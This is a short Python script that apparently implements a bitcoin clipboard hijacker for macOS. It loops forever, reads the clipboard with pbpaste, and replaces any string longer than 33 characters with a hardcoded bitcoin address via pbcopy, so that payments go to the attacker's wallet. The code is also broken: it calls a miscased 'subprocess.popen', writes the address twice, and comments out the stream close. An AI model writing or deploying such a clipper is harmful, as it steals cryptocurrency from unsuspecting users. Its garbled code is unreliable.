import subprocess

destination_address = b'1FfmbHfnpaZjKFvyi1okTjJJusN455paPH'

def get_clipboard():
    p = subprocess.popen(['pbpaste'], stdout=subprocess.PIPE) # acces clipboard
    data = str(p.stdout.read()) # read data on clipboard on converte to string
    if len(data) > 33: # if bitcoin address
       swap_address(data)

def swap_address(data):
    p = subprocess.popen(['pbcopy'], stdin=subprocess.PIPE) # access clipboard
    p.stdin.write(destination_address) # write destination address
    p.stdin.write(destination_address) # write destination address
    p.stdin.close# ()
while True:
    get_clipboard()
